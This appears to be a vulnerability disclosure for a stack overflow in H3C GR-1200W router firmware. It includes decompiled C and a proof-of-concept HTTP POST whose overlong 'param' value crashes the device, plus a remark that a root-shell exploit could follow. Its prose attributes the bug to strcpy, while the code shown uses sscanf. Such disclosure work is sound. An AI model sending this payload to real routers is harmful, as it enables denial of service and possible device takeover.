### Affected product

```
H3C GR-1200W  MiniGRW1A0V100R006
```

### Firmware

```
https://www.h3c.com/cn/d_202102/1383837_30005_0.htm
```
In function sub_4B0020,the content obtained by the program from the parameter "param" is passed to s .Then the s is directly copied into the v5 stack through the strcpy function.
There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code 
Execution with carefully crafted overflow data.

### Detail

```c
int __fastcall sub_4B0020(int a1)
{
  int v2; // [sp+18h] [+18h]
  int v3; // [sp+1Ch] [+1Ch]
  char *s; // [sp+24h] [+24h]
  int v5[5]; // [sp+2Ch] [+2Ch] BYREF

  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 0;
  v5[3] = 0;
  s = (char *)sub_4E58C8(a1, "param", &unk_4FFD30);
  sscanf(s, "%[^;]", v5);
  if ( atoi((const char *)v5) == 1 )
  {
    v3 = CFG_GetTBLFirstIndex(254, 507772928);
    while ( v3 > 0 )
    {
      v2 = v3;
      v3 = CFG_GetTBLNextIndex(254, v3 + 507772928);
      CFG_Del(254, v2 + 507772928);
    }
  }
  CFG_Del(254, 507510784);
  CFG_Set(254, 507514880, v5);
  CFG_SetInt32Value(254, 507518976, 1);
  return 0;
}
```
### POC

```python
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.11:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://121.226.152.63:8443/router_password_mobile.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: https://192.168.0.124:80
DNT: 1
Connection: close
Cookie: JSESSIONID=5c31d502
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

CMD=ap_version_check&param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,;

```




You can see the router crash, and finally we can write an exp to get a root shell
